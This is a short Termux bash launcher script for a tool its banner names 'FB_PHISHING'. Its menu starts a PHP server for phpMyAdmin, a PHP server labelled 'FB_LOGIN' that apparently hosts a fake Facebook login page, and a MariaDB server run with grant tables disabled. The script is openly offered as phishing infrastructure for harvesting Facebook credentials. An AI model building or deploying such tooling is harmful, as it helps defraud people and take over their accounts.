#! data/data/com.termux/files/usr/bin/bash

#variables
                red='\033[1;31m'
                green='\033[1;32m'
                yellow='\033[1;33m'
                blue='\033[1;34m'
                magenta='\033[1;35m'
                cyan='\033[1;36m'
                reset='\033[0m'
printf $cyan
echo      "
 ░█▀▀░█▀▄░░░░░█▀█░█░█░▀█▀░█▀▀░█░█░▀█▀░█▀█░█▀▀
 ░█▀▀░█▀▄░░░░░█▀▀░█▀█░░█░░▀▀█░█▀█░░█░░█░█░█░█
 ░▀░░░▀▀░░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀▀
			                     "
printf $reset
echo -e   "\e[1;34m  AUTHOR:\033[1;31m VeNOM24"
echo -e   "\e[1;34m  TOOL:\033[1;31m   FB_PHISHING"
echo -e   "\e[1;34m  VERSION:\033[1;31m1.0"

echo -e "\e[1;36m =============================================
\033[1;36m ============================================="
echo ""
echo -e "\e[1;34m  [01]\033[1;31m PHPMYADMIN PUERTO 4545"
echo -e "\e[1;34m  [02]\033[1;31m FB_LOGIN   PUERTO 8080"
echo -e "\e[1;34m  [03]\033[1;31m MARIADB    PUERTO 3036"
echo -e "\e[1;34m  [00]\033[1;31m EXIT"                                                              


echo ""
echo ""
echo -e "\e[1;36m"                                  
echo -n "  SELECT YOUR OPTION #>> ";
printf $reset
read OPCION;

case $OPCION in

01)
cd 
cd $PREFIX/share/phpmyadmin

php -S localhost:4545
	
;;
02)
php -S localhost:8080

;;

03)
	mysqld --skip-grant-tables --general-log &

	;;
04)
	exit
	;;
esac

